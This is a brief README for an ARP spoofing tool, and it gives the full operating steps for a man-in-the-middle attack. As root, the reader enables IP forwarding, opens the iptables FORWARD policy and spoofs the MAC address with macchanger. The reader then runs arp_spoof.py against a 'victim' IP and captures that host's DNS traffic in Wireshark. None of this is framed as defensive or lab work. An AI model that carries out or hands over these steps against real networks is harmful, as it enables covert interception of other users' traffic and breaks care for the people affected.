# ARP Spoofer

## Table of Contents
- [Usage](#usage)

### Prerequisites

What things you need to run as root

```bash
iptables --policy FORWARD ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
ifconfig eth0 down
macchanger --mac "aa:bb:cc:44:55:66" eth0
ifconfig eth0 up
```

## Usage <a name = "usage"></a>

run as root

--target(-t) ip_victim

```bash
python3 arp_spoof.py -t 192.168.1.x
```

## wireshark

run as user

```bash
wireshark &>/dev/null
```
filter for DNS